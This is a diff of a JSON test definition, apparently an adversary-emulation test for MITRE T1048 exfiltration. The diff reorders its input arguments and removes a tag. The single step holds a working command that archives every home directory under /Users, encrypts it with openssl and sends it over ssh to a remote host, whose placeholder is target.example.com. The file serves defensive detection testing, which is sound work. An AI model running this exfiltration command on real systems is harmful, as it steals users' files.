@@ -8,7 +8,7 @@
   ],
   "steps": [
     {
-      "id": "5e3ae13b-cbda-4cee-bb93-11086f69eb16",
+      "id": "a69690ab-f3d6-4c28-bb11-e8ee1a958c27",
       "type": "execute-command",
       "data": {
         "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat \u003e /Users.tar.gz.enc'\n",
@@ -18,10 +18,15 @@
     }
   ],
   "tags": [
-    "T1048",
-    "atomic-red-team"
+    "T1048"
   ],
   "input_arguments": [
+    {
+      "name": "user_name",
+      "type": "string",
+      "description": "username for domain",
+      "value": "atomic"
+    },
     {
       "name": "password",
       "type": "string",
@@ -33,12 +38,6 @@
       "type": "url",
       "description": "target SSH domain",
       "value": "target.example.com"
-    },
-    {
-      "name": "user_name",
-      "type": "string",
-      "description": "username for domain",
-      "value": "atomic"
     }
   ]
 }
